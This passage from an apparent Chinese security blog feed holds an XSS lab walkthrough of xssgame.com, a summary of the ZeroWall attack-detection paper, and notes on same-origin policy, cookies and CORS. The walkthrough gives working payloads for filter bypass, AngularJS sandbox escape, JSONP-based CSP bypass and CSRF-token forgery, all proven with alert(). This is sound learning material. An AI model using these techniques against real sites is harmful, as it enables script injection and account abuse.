/&gt;</code></p><p>替换机制：<br>如果目标系统的过滤器会把<code>&lt;script&gt;&lt;/script&gt;</code>标签对都过滤替换为NAUGHTY_HACKER字段，那么，我们提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 之后的结果就会是NAUGHTY_HACKERalert(1)NAUGHTY_HACKER。<br>但如果我们把&lt;<code>script&gt;标签对的声明改为&lt;script &lt;script&gt;&gt;</code> 和 <code>&lt;/script &lt;/script&gt;&gt;</code>这种嵌套式样式后，那么参照替换为NAUGHTY_HACKER字段的规则，对于<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>来说，目标过滤器会把它过滤为：<br><code>&lt;script NAUGHTY_HACKER&gt;alert(1)&lt;/script NAUGHTY_HACKER&gt;</code><br>看上去是个莫名标签，但浏览器的容错机制仍会执行上面的代码</p><h2 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h2><p><a href="http://www.xssgame.com/">http://www.xssgame.com/</a><br>第一关直接插入就好了，来看第二关<br>测试xss的主要思路是看回显在哪里，通过自定义化输入闭合或绕过一些限制<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-1.png"><br>可以看到我们的输入回显在两个地方，针对第一个地方<code>onload=&quot;startTimer(&#39;1&#39;);&quot;</code>，在JS代码中，如：<code>var a = &#39;a&#39; + alert(); </code>，在运算过程中会自动执行响应函数，我们可以利用这里的onload函数<code>onload=&quot;startTimer(&#39;1&#39; + alert(1)+&#39;1&#39;);&quot; /&gt;</code>，构造这样的语句就可以实现弹窗，使用这个payload也可以实现：<code>&#39;); alert(1); //</code></p><p>第三关，根据提示，直接看代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">chooseTab</span>(<span class="params">name</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">&quot;Cat &quot;</span> + <span class="built_in">parseInt</span>(name) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        html += <span class="string">&quot;&lt;img src=&#x27;/static/img/cat&quot;</span> + name + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tabContent&#x27;</span>).<span class="property">innerHTML</span> = html;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Select the current tab</span></span><br><span class="line">        <span class="keyword">var</span> tabs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.<span class="property">length</span>; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (tabs[i].<span class="property">id</span> == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(name)) &#123;</span><br><span class="line">            tabs[i].<span class="property">className</span> = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tabs[i].<span class="property">className</span> = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span> = name;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Tell parent we&#x27;ve changed the tab</span></span><br><span class="line">        top.<span class="title function_">postMessage</span>(&#123;<span class="string">&#x27;url&#x27;</span>: self.<span class="property">location</span>.<span class="title function_">toString</span>()&#125;, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>看到了有用到img标签，前面总结的载荷中就写到了，图片显示错误的话会自动触发onerror，<code>&lt;img src=x ononerrorerror=alert(1) /&gt;</code>，构造payload<code>/#1&#39; onerror=&#39;alert(11)&#39;</code>，来到下一关</p><p>第四关，看到没有任何回显，在几个页面间跳转，F12查看页面源代码，发现了一行这样的代码<code>setTimeout(function() &#123; window.location = &#39;welcome&#39;; &#125;, 1000);</code>，这里需要提到一个知识点：<code>window.location</code> 等同于 <code>window.location.href</code>，而href属性支持执行javascript也就是这样写：<code>href=&#39;javascript:alert()&#39;</code>，因此可以构造Payload：<code>next=javascript:alert()</code>，成功执行</p><p>第五关，用到了Angular框架，这个框架的特点是可以用<code>&#123;&#123;1+1&#125;&#125;</code>类似这样的方式执行代码，但是我尝试输入后，发现被html编码了，而且也没有什么地方可以执行，接下来审计代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      angular.<span class="title function_">module</span>(<span class="string">&#x27;myApp&#x27;</span>, [])</span><br><span class="line">      .<span class="title function_">controller</span>(<span class="string">&#x27;myController&#x27;</span>, [<span class="string">&#x27;$scope&#x27;</span>, <span class="keyword">function</span> (<span class="params">$scope</span>) &#123;</span><br><span class="line">        $scope.<span class="property">query</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $scope.<span class="property">alert</span> = <span class="variable language_">window</span>.<span class="property">alert</span>;</span><br><span class="line">      &#125;]);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> <span class="variable constant_">UTM_PARAMS</span> = [<span class="string">&quot;utm_content&quot;</span>, <span class="string">&quot;utm_medium&quot;</span>, <span class="string">&quot;utm_source&quot;</span>,</span><br><span class="line">          <span class="string">&quot;utm_campaign&quot;</span>, <span class="string">&quot;utm_term&quot;</span>]</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (location.<span class="property">search</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">var</span> params = location.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>).<span class="title function_">split</span>(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> params) &#123;</span><br><span class="line">          <span class="keyword">var</span> r = params[p].<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (r.<span class="property">length</span> == <span class="number">2</span> &amp;&amp; <span class="variable constant_">UTM_PARAMS</span>.<span class="title function_">indexOf</span>(r[<span class="number">0</span>]) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(r[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (el.<span class="property">length</span>) el[<span class="number">0</span>].<span class="property">value</span> = <span class="built_in">decodeURIComponent</span>(r[<span class="number">1</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上面代码涉及到UTM解析：UTM参数是在线营销和网站分析中的一个重要工具，它们是一组查询参数，可以附加到URL中，用于追踪和分析营销活动的效果。UTM代表Urchin Tracking Module。<code>location.search</code>是对URL的查询字符串，<code>split(&#39;&amp;&#39;)</code>是把字符串分割成数组，<code>split(&#39;=&#39;)</code>是把数组分割成键值对，<code>decodeURIComponent(r[1])</code>是把编码后的字符串解码，并赋值给el[0]。也就是对参数中的代码作了执行，替换到UTM_PARAMS中某个节点处，则构造payload：<code>?utm_term=&#123;&#123;alert()&#125;&#125;</code>，成功。</p><p>第六关，发现和前面的类似，但都尝试了下不行，其实刚才我遇到Angular后第一反应是去搜有没有相应的框架漏洞，这次又检索了下，发现有一个漏洞，满足源代码中引用的版本：1.2.0<br>下面的博客中给出了相应的payload<br><a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</a><br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-2.png"><br>尝试输入，构造参数<code>?query=&#123;&#123;a='constructor';b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()&#125;&#125;</code>，直接放在url中没有反应，看了解析说用<code>&amp;lcub;</code>是{的字符实体，<code>&amp;rcub;</code>是}的字符实体。使用这些实体替代原字符可以实现注入。</p><p>第七关，这关打开后看到熟悉的CSP，CSP是Content Security Policy的缩写，前两天刚看了。审计代码发现有个关键的level7.js文件，其中内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> m = location.<span class="property">search</span>.<span class="title function_">match</span>(<span class="string">&#x27;menu=(.*)&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> menu = m ? <span class="title function_">atob</span>(m[<span class="number">1</span>]) : <span class="string">&#x27;about&#x27;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;script src=&quot;jsonp?menu=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(menu) + <span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Display stuff returned from server side.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">data</span> - JSON data from server side</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data.<span class="property">title</span>) <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;h1&gt;&#x27;</span> + data.<span class="property">title</span> + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (data.<span class="property">pictures</span>) data.<span class="property">pictures</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">url</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;/static/img/&#x27;</span> + url + <span class="string">&#x27;&quot;&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><p>在其中看到了熟悉的jsonp，jsonp可能会错误接收callback 参数，构造payload：<code>jsonp?callback=1</code>，有正常回显<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-3.png"><br>接下来想办法插入执行代码，观察url参数是被base64编码后的，随便输入一些尝试下，可以显示在页面，编码后传入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>（<code>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>），发现没有正常显示。观察控制台输出：<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-4.png"><br>因为同源策略被禁止代码执行，这个时候就想到上面的jsonp，利用jsonp执行代码，构造payload <code>&lt;script src=&#39;jsonp?callback=alert();//&#39;&gt;&lt;/script&gt;</code>，编码后：<code>PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCk7Ly8nPjwvc2NyaXB0Pg==</code>，最终成功执行。</p><p>第8关，先走了下流程，大概就是可以set自己的名字，然后可以给别人转账，那么我们的思路就是，给出一个链接，可以set的同时还可以直接转账，首先看下set的内容：<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=12345&amp;redirect=index</code><br>返回包中<code>Set-Cookie: name=12345; Path=/</code> 和我们设定的一致，看下转钱的包，请求如下：<br><code>http://www.xssgame.com/f/d9u16LTxchEi/transfer?name=31123&amp;amount=123&amp;csrf_token=99DPV595WL</code><br>我们先验证下set，构造payload<code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=12345&amp;redirect=index</code>，发现成功set，因为这里的set之后直接就有跳转，那我们直接构造一个转账页面跳转过去执行，因为<code>&amp;</code>会被url解析为参数，所以这里用url编码下<br><code>transfer%3Fname%3D31123%26amount%3D123%26csrf_token%3D12345</code>，直接在控制台执行<code>encodeURIComponent(&#39;transfer?name=31123&amp;amount=123&amp;csrf_token=12345&#39;)</code>即可，到这里是能干坏事了，但还是没有正常执行，发现转账数目错误的情况下会有回显，构造payload如下：<code>transfer?name=31123&amp;amount=%3Cscript%3Ealert()%3C/script%3E&amp;csrf_token=12345</code>。</p><h2 id="防范XSS"><a href="#防范XSS" class="headerlink" title="防范XSS"></a>防范XSS</h2><p><a href="https://segmentfault.com/a/1190000022678120">https://segmentfault.com/a/1190000022678120</a><br><a href="https://www.cnblogs.com/blbl-blog/p/17188558.html">https://www.cnblogs.com/blbl-blog/p/17188558.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【论文精读】ZeroWall Detecting Zero-Day Web Attacks through Encoder-Decoder Recurrent Neural Networks</title>
      <link href="/2024/09/20/PaperReading/ZeroWall/"/>
      <url>/2024/09/20/PaperReading/ZeroWall/</url>
      
        <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>这篇论文是针对0day攻击的检测，主要方法是利用编码器解码器神经网络，编码器解码器可以将payload编码之后再还原，那么拿很多正常数据报训练之后，还原输出的结果，如果还原的结果和正常数据报相似度高，那么就是正常数据报，否则就是异常数据报。</p><p>零日网络攻击是网络安全的最严重威胁之一，因为它们是未知的，所以很难被基于签名的网络应用防火墙（WAF）检测到。文章提出了一种名为ZeroWall的无监督方法，该方法可以与现有的WAF协同工作，有效地检测零日网络攻击。ZeroWall使用历史网络请求（大多数是良性的）来训练一个自编码翻译机器，以捕捉良性请求的语法和语义模式。在实时检测中，如果WAF未能检测到的零日攻击请求不能被自编码翻译机器很好地理解，并且不能被机器翻译回原始请求，则被声明为攻击。在对8个真实世界的数据集（包含14亿个网络请求）的评估中，ZeroWall成功地检测到了WAF漏掉的真实零日攻击，并且取得了超过0.98的高F1分数，显著优于所有基线方法。</p><h2 id="Related-Work"><a href="#Related-Work" class="headerlink" title="Related Work"></a>Related Work</h2><p>基于异常的web攻击检测方法可以分为以下三种：</p><ul><li>点异常检测：这类方法侧重于单个数据包的异常。ZeroWall也属于这一类，它侧重于利用单个HTTP请求中的语法和语义。一种简单的方法是将HTTP请求“句子”分割成单词，恶意请求中使用的单词集合与良性请求中的单词集合可能存在差异，这些差异可以作为检测攻击的指标。</li><li>基于上下文的上下文异常检测：这类方法利用请求之间的上下文信息。然而，对于零日Web攻击检测来说，这些方法通常不太有效，因为零日攻击数据包在上下文中和统计数据中通常不会被反映出来。</li><li>基于统计的集体异常检测：这些方法依赖于大量数据的集体和统计信息，但在检测零日Web攻击方面不太有效，因为零日Web攻击在大量Web请求中非常罕见。</li></ul><p>而基于点异常的检测，又有着以下一些具体的解决方案：</p><ul><li>基于HMM的方法：例如，Spectrogram是一个基于隐马尔可夫模型（HMM）的方法，用于重建内容流并从数据包中提取特征。Hmmpayl是一个基于HMM的入侵检测系统，用于从有效载荷中检测攻击。然而，HMM模型在处理复杂请求时表现不佳，因为序列长度不适合时会导致性能下降。</li><li>基于深度学习的方法：提出了基于深度学习的方法来学习复杂的HTTP请求日志。这些方法包括使用神经网络优化反向传播用于入侵检测系统，以及提出多种针对不同类型攻击的深度学习方法。还有基于卷积神经网络（CNN）模型来训练请求中的单词。</li><li>无监督方法：例如，使用n-gram和堆叠自动编码器的无监督方法来学习HTTP请求。然而，这种方法直接使用编码器输出（降维）结果进行异常检测，这可能导致异常样本的输出与正常样本无法区分，从而限制了性能。</li></ul><h2 id="Core-Idea"><a href="#Core-Idea" class="headerlink" title="Core Idea"></a>Core Idea</h2><p><img src="/2024/09/20/PaperReading/ZeroWall/image.png"><br>在这篇论文的”核心思想和系统概述（CORE IDEA AND SYSTEM OVERVIEW）”部分，作者详细介绍了ZeroWall的设计目标、核心思想和整体架构。这一部分内容可以分为以下几个关键点：</p><h3 id="设计目标"><a href="#设计目标" class="headerlink" title="设计目标"></a>设计目标</h3><ol><li><strong>与现有WAF协同工作</strong>：ZeroWall旨在作为现有基于签名的Web应用防火墙（WAF）的补充，而不是完全取代它们。这种设计允许ZeroWall在不增加额外开销的情况下，与WAF一起部署，共同提高Web安全。</li><li><strong>检测单个HTTP请求中的零日Web攻击</strong>：ZeroWall选择使用无监督方法，因为它不需要事先知道攻击的确切模式，因此比有监督方法更有潜力检测到零日攻击。</li></ol><h3 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h3><ol><li><strong>基于异常检测的无监督方法</strong>：ZeroWall的训练数据来自于WAF允许的历史Web请求，这些请求大多数被认为是良性的。作者使用编码器-解码器循环神经网络作为基础训练算法，这些网络在训练足够的句子后能够“理解”这种语言，从而可以将输入句子翻译成潜在的表示，然后再翻译回原语言。</li><li><strong>将零日Web攻击检测问题转化为机器翻译质量评估问题</strong>：ZeroWall的核心观察是，HTTP请求遵循HTTP协议，可以被视为“HTTP请求语言”中的一句话。通过训练，网络能够将良性输入Web请求“翻译”成潜在表示，然后“翻译”回接近原始请求的输出Web请求。如果翻译质量高，请求则被认为是良性的；否则，被认为是攻击。</li></ol><h3 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h3><ol><li><strong>离线定期重新训练</strong>：定期（例如，每天）或手动触发离线训练，以利用最新WAF规则过滤的最新请求数据。这个过程包括构建词汇表、将HTTP请求日志转换为令牌序列，并训练编码器-解码器神经网络。</li><li><strong>在线检测</strong>：在线检测阶段，ZeroWall实时检测HTTP请求是否为良性或恶意（即零日攻击）。这个阶段包括令牌解析器、编码器-解码器网络、异常检测和手动调查等组件。给定一个HTTP请求作为输入，ZeroWall首先使用离线构建的词汇表将请求转换为令牌序列，然后编码器-解码器网络重建恢复的令牌序列。异常检测组件通过计算原始和恢复令牌序列之间的BLEU分数来决定请求是良性还是恶意的。</li><li><strong>手动调查</strong>：为了处理无监督异常检测可能产生的误报，被标记为“恶意”的请求将由安全工程师手动调查。确认的误报将被加入白名单，以避免未来因相同模式的请求而产生的误报。确认的真实零日攻击将用于更新WAF规则。</li></ol><h2 id="DESIGN-DETAILS"><a href="#DESIGN-DETAILS" class="headerlink" title="DESIGN DETAILS"></a>DESIGN DETAILS</h2><h3 id="A-Token-Parser（令牌解析器）"><a href="#A-Token-Parser（令牌解析器）" class="headerlink" title="A. Token Parser（令牌解析器）"></a>A. Token Parser（令牌解析器）</h3><p>Token Parser负责将HTTP请求字符串转换为令牌序列。这个过程包括三个主要步骤：</p><ol><li><strong>构建词汇表（Vocabulary）</strong>：首先，系统通过分隔符（如标点和空格）将请求字符串分割成多个“单词”。然后，过滤掉无用的词（如变量和停用词），并使用词嵌入技术来表示这些词。词汇表中的每个词都与一个唯一的标记ID关联。</li><li><strong>生成令牌序列（Token Sequence）</strong>：一旦词汇表构建完成，系统就可以将请求转换为令牌序列。这个过程通过保留词汇表中的词并过滤掉其他词来完成。例如，变量和停用词被替换为占位符。</li><li><strong>令牌嵌入（Token Embedding）</strong>：每个令牌由其在词汇表中的ID表示，这可能会忽略令牌的含义。因此，系统添加了一个嵌入层，将这些标记ID映射到潜在的向量空间中，使用向量之间的距离来表示它们之间的逻辑关系。</li></ol><h3 id="B-Encoder-Decoder-Network（编码器-解码器网络）"><a href="#B-Encoder-Decoder-Network（编码器-解码器网络）" class="headerlink" title="B. Encoder-Decoder Network（编码器-解码器网络）"></a>B. Encoder-Decoder Network（编码器-解码器网络）</h3><p>编码器-解码器网络的核心功能是将一个序列映射到另一个序列。在ZeroWall中，输入是原始令牌序列，输出是网络学习后重建的令牌序列。</p><ol><li><strong>编码器（Encoder）</strong>：编码器是一个LSTM（长短期记忆）网络，它读取令牌序列并构建一个固定维度的向量来表示原始序列。</li><li><strong>解码器（Decoder）</strong>：解码器是另一个LSTM网络，它使用编码器的表示来计算输出序列的概率。解码器的输出是一个概率向量，每个元素代表词汇表中某个标记的概率。解码器选择概率最高的标记作为输出。</li><li><strong>重建（Reconstruction）</strong>：网络试图使用相同的词汇表中的标记重建原始令牌序列，这代表了相同的信息。重建的序列与原始序列之间的差异用于后续的异常检测。</li></ol><h3 id="C-Anomaly-Detection（异常检测）"><a href="#C-Anomaly-Detection（异常检测）" class="headerlink" title="C. Anomaly Detection（异常检测）"></a>C. Anomaly Detection（异常检测）</h3><p>异常检测的核心思想是，编码器-解码器网络能够更准确地重建良性令牌序列。对于零日Web攻击请求，网络输出将与输入大相径庭。为了进行异常检测，系统比较原始令牌序列和恢复令牌序列之间的相似性，并将其用作异常指标。</p><ol><li><strong>使用BLEU指标</strong>：BLEU（Bilingual Evaluation Understudy）指标用于计算两个序列之间的相似度。BLEU值范围从0到1，值越高表示源序列和目标序列之间的相似度越高。</li><li><strong>恶意分数（Malicious Score）</strong>：为了检测异常，系统定义了恶意分数（1 - BLEU）作为估计器。较高的恶意分数意味着网络无法重建给定序列，表明输入序列可能是恶意的。</li><li><strong>阈值判断</strong>：恶意分数与特定阈值进行比较，以确定请求是良性还是恶意的。<br><img src="/2024/09/20/PaperReading/ZeroWall/image-1.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【web安全】浏览器同源策略和跨域问题</title>
      <link href="/2024/09/20/WebSecurity/owasptop/browserorigin/"/>
      <url>/2024/09/20/WebSecurity/owasptop/browserorigin/</url>
      
        <content type="html"><![CDATA[<p>写这篇笔记的想法是之前看白帽子讲web安全的时候，就看到有关浏览器对域采取的一系列安全措施，如：同源策略等，后面为了方便web应用有在数据包header中添加字段，但也带来了很多风险。<br>在这一背景下想要系统整理一下相关的知识<br>参考博客：<a href="https://www.freebuf.com/articles/web/208672.html">https://www.freebuf.com/articles/web/208672.html</a><br><a href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>找到2017年的一篇论文：Same-Origin Policy: Evaluation in Modern Browsers，发在顶会上的</p><p>个人理解的域和源本质上是一样的，只是域是针对单个的，而有源就要有汇，是针对双方的。在浏览器的上下文中，域（Domain） 是一种安全模型的基础构件，主要用来确定哪些网络资源（如网页、图片、脚本等）可以与哪些其他资源互相交互。而域的概念是为了实现 Web 安全而设计的，主要目的是防止恶意网站访问或操作其他网站的数据，这种安全策略被称为同源政策（Same-Origin Policy, SOP）（是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。）</p><p><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image.png"></p><p>浏览器的同源策略：对于Web页面上的脚本来说，只能访问来自同一来源的数据，而不能访问或修改不同来源的数据。这里的“来源”（origin）是由协议（protocol）、域名（domain）和端口（port）三个部分组成的。只有当这三者完全相同的时候，两个资源才被认为是“同源”的。<br>虽然浏览器为了安全目的引入了同源政策，但同时也给开发者们带来很多问题，这也催生出了很多的跨域手段，带来了新的攻击面。</p><p>①.<a href="https://blog.csdn.net/bestxianfeng163/article/details/105666140">浏览器</a>先根据同源策略对前端页面和后台交互地址做匹配，若同源，则直接发送数据请求；若不同源，则发送跨域请求。<br>②.服务器解析程序收到浏览器跨域请求后，根据自身配置返回对应文件头。若未配置过任何允许跨域，则文件头里不包含Access-Control-Allow-origin字段，若配置过域名，则返回Access-Control-Allow-origin+ 对应配置规则里的域名的方式。<br>③.浏览器根据接受到的http文件头里的Access-Control-Allow-origin字段做匹配，若无该字段，说明不允许跨域；若有该字段，则对字段内容和当前域名做比对，如果同源，则说明可以跨域，浏览器发送该请求；若不同源，则说明该域名不可跨域，不发送请求</p><h2 id="Cookie的跨域问题"><a href="#Cookie的跨域问题" class="headerlink" title="Cookie的跨域问题"></a>Cookie的跨域问题</h2><p>在Cookie设置中有很多<a href="https://blog.csdn.net/qq_51383106/article/details/131458419">属性</a></p><table><thead><tr><th>名称</th><th>Cookie的name</th></tr></thead><tbody><tr><td>值</td><td>Cookie的value</td></tr><tr><td>Domain</td><td>Cookie的域。如果设成 xxx.com(一级域名)，那么子域名x.xxx.com(二级域名)，都可以使用xxx.com的Cookie</td></tr><tr><td>Path</td><td>Cookie的路径。如果设为&#x2F;，则同域名全部路径均可使用该Cookie。如果设为&#x2F;xxx&#x2F;，则只有路径为&#x2F;xxx&#x2F;可以使用该Cookie。</td></tr><tr><td>Expires &#x2F; Max-Age</td><td>Cookie的超时时间。如果值为时间，则在到达指定时间后Cookie失效。如果值为Session(会话)，Cookie会同Session一起失效，当整个浏览器关闭的时候Cookie失效。</td></tr><tr><td>Size</td><td>Cookie的大小。</td></tr><tr><td>HttpOnly</td><td>值为true时，Cookie只会在Http请求头中存在，不能通过doucment.cookie(JavaScript)访问Cookie。</td></tr><tr><td>Secure</td><td>值为true时，只能通过https来传输Cookie。</td></tr><tr><td>SameSite</td><td>值为Strict，完全禁止第三方Cookie，跨站时无法使用Cookie。值为Lax，允许在跨站时使用Get请求携带Cookie，下面有一个表格介绍Lax的Cookie使用情况。值为None，允许跨站跨域使用Cookie，前提是将Secure属性设置为true。Priority ：Cookie的优先级。值为Low&#x2F;Medium&#x2F;High，当Cookie数量超出时，低优先级的Cookie会被优先清除。</td></tr></tbody></table><p>针对上面的属性，如果设置不当，就有可能存在安全问题：<br>上面的Cookie配置中涉及到安全性的属性主要包括Domain、Path、HttpOnly、Secure和SameSite。每个属性的设置都会直接影响到Cookie的安全性和应用的安全风险。下面分别分析这些属性可能引起的安全问题：</p><ol><li>Domain（域）：如果Domain设置不当，比如设置为一级域名（例如<code>xxx.com</code>），那么所有xxx.com的子域（如<code>sub.xxx.com</code>）都可以访问这个Cookie。这可能会导致Cookie被不安全的子域访问，增加数据泄露的风险。依据最小特权原则，尽量将cookie作用域设置的越小越好。</li><li>Path（路径）：如果Path设置为根路径（<code>/</code>），则整个网站的所有页面都能访问这个Cookie。如果某些路径下的页面存在安全漏洞，那么这些页面也能访问到Cookie，存在被利用的风险。</li><li>HttpOnly：如果HttpOnly属性未被设置（即默认情况下或设置为false），Cookie可以通过客户端脚本，如JavaScript的<code>document.cookie</code>访问。</li><li>Secure：如果Secure属性未设置，Cookie可以通过不安全的HTTP连接传输。</li><li>SameSite</li></ol><ul><li><strong>Strict</strong>：严格的设置可能会导致合法的跨站请求场景（例如，用户从其他网站点击链接跳转到站点时）下Cookie不被发送，影响用户体验。</li><li><strong>Lax</strong>：相对宽松，但在某些情况下（如POST请求等）仍不发送Cookie，可能影响功能的实现。</li><li><strong>None</strong>：如果没有正确设置Secure属性，设置SameSite为None时可能导致Cookie在跨站请求中被发送，增加CSRF攻击的风险。</li></ul><p><a href="https://blog.csdn.net/dingtao_237/article/details/103007697">子父域问题</a>：子域可以获取到父域的cookie，反之则不行。所以我们在种全站cookie的时候（比如登录状态），都会种到全站域名的父域上，这样全站可以共享登录状态。当然这里说的全站域名都是一个父域的情况。</p><h2 id="CORS（跨源资源共享）"><a href="#CORS（跨源资源共享）" class="headerlink" title="CORS（跨源资源共享）"></a>CORS（跨源资源共享）</h2><p>CORS 全称 Cross-Origin Resource Sharing, 跨域资源共享，是 HTML5 的一个新特性，已被所有浏览器支持，跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据。</p><p>CORS（Cross-Origin Resource Sharing，跨源资源共享）是一个允许在网页脚本中访问不同源服务器资源的安全功能。它是一个 W3C 标准，旨在克服浏览器同源政策对资源跨域访问的限制。</p><h3 id="CORS-的工作原理"><a href="#CORS-的工作原理" class="headerlink" title="CORS 的工作原理"></a>CORS 的工作原理</h3><p><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image-1.png"><br>CORS 通过添加一系列新的 HTTP 头部来扩展已有的 HTTP 